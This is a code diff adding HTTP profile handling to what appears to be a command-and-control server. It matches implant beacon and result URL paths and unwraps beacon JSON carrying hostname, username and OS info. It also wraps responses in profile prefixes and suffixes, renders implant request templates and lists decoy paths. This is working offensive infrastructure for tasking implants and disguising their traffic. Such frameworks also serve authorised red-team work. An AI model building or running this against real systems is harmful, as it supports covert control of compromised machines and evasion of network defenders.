@@ -156,6 +156,165 @@ class ProfileEngine:
             "sleep_sec": p.http.sleep_sec,
             "jitter_pct": p.http.jitter_pct,
             "decoy_enabled": p.http.decoy_enabled,
+            "decoy_paths": list(p.http.decoy_paths or []),
+            "request_body_template": p.http.request_body_template,
+            "response_prefix": p.http.response_prefix,
+            "response_suffix": p.http.response_suffix,
             "profile_id": p.id,
             "profile_name": p.name,
         }
+
+    # --- Live HTTP path matching / body codec ---
+
+    LEGACY_BEACON_PATHS = frozenset(
+        {
+            "/api/v1/implant/beacon",
+            "/implant/beacon",
+            "/beacon",
+        }
+    )
+    LEGACY_RESULT_PATHS = frozenset(
+        {
+            "/api/v1/implant/beacon/result",
+            "/implant/beacon/result",
+            "/beacon/result",
+        }
+    )
+
+    def allowed_beacon_paths(self) -> set[str]:
+        paths = set(self.LEGACY_BEACON_PATHS)
+        for p in self._cache.values():
+            if p.channel == "http":
+                for u in p.http.uris or []:
+                    if u:
+                        paths.add(u if u.startswith("/") else f"/{u}")
+        # always include active
+        act = self.active()
+        if act and act.channel == "http":
+            for u in act.http.uris or []:
+                if u:
+                    paths.add(u if u.startswith("/") else f"/{u}")
+        return paths
+
+    def match_beacon_path(self, path: str) -> tuple[str, C2Profile | None]:
+        """
+        Returns (kind, profile) where kind is 'beacon' | 'result' | ''.
+        Profile is the matching profile (or active for legacy paths).
+        """
+        path_only = (path or "").split("?", 1)[0]
+        if not path_only.startswith("/"):
+            path_only = "/" + path_only
+
+        if path_only in self.LEGACY_RESULT_PATHS:
+            return "result", self.active()
+        if path_only in self.LEGACY_BEACON_PATHS:
+            return "beacon", self.active()
+
+        # profile result: <uri>/result
+        if path_only.endswith("/result"):
+            base = path_only[: -len("/result")] or "/"
+            for p in self._cache.values():
+                if p.channel != "http":
+                    continue
+                uris = [u if u.startswith("/") else f"/{u}" for u in (p.http.uris or [])]
+                if base in uris:
+                    return "result", p
+            return "", None
+
+        for p in self._cache.values():
+            if p.channel != "http":
+                continue
+            uris = [u if u.startswith("/") else f"/{u}" for u in (p.http.uris or [])]
+            if path_only in uris:
+                return "beacon", p
+        return "", None
+
+    def is_profile_http_path(self, path: str) -> bool:
+        kind, _ = self.match_beacon_path(path)
+        return kind in ("beacon", "result")
+
+    @staticmethod
+    def _looks_like_beacon(obj: dict[str, Any]) -> bool:
+        keys = set(obj.keys())
+        return bool(
+            keys
+            & {
+                "session_id",
+                "hostname",
+                "username",
+                "os_info",
+                "task_id",
+                "result",
+                "metadata",
+            }
+        )
+
+    def unwrap_request_body(
+        self,
+        profile: C2Profile | None,
+        raw: bytes | str | dict[str, Any] | None,
+    ) -> dict[str, Any]:
+        """Extract beacon/result JSON from raw body (supports profile wrappers)."""
+        if raw is None:
+            return {}
+        if isinstance(raw, dict):
+            data: Any = raw
+        else:
+            if isinstance(raw, bytes):
+                text = raw.decode("utf-8", errors="replace").strip()
+            else:
+                text = str(raw).strip()
+            if not text:
+                return {}
+            # strip optional response-style prefix/suffix if client echoed
+            p = profile or self.active()
+            if p and p.channel == "http":
+                pref = p.http.response_prefix or ""
+                suf = p.http.response_suffix or ""
+                if pref and text.startswith(pref):
+                    text = text[len(pref) :]
+                if suf and text.endswith(suf):
+                    text = text[: -len(suf)]
+            try:
+                data = json.loads(text)
+            except json.JSONDecodeError:
+                return {}
+
+        found = self._extract_beacon_dict(data)
+        return found if found is not None else {}
+
+    def _extract_beacon_dict(self, data: Any) -> dict[str, Any] | None:
+        if isinstance(data, dict):
+            if self._looks_like_beacon(data):
+                return data
+            # common wrappers
+            for key in ("Records", "records", "value", "data", "payload", "body"):
+                if key in data:
+                    inner = self._extract_beacon_dict(data[key])
+                    if inner is not None:
+                        return inner
+            # first nested dict that looks like beacon
+            for v in data.values():
+                inner = self._extract_beacon_dict(v)
+                if inner is not None:
+                    return inner
+        elif isinstance(data, list):
+            for item in data:
+                inner = self._extract_beacon_dict(item)
+                if inner is not None:
+                    return inner
+        return None
+
+    def wrap_response(self, profile: C2Profile | None, obj: dict[str, Any]) -> str:
+        p = profile or self.active()
+        raw = json.dumps(obj, separators=(",", ":"))
+        if not p or p.channel != "http":
+            return raw
+        return f"{p.http.response_prefix or ''}{raw}{p.http.response_suffix or ''}"
+
+    def apply_body_template(self, profile: C2Profile | None, beacon_obj: dict[str, Any]) -> str:
+        """Render request body for implant using profile template."""
+        p = profile or self.active() or DEFAULT_PROFILES[0]
+        shaped = self.shape_http_request(p, beacon_obj)
+        return shaped["body"]
+
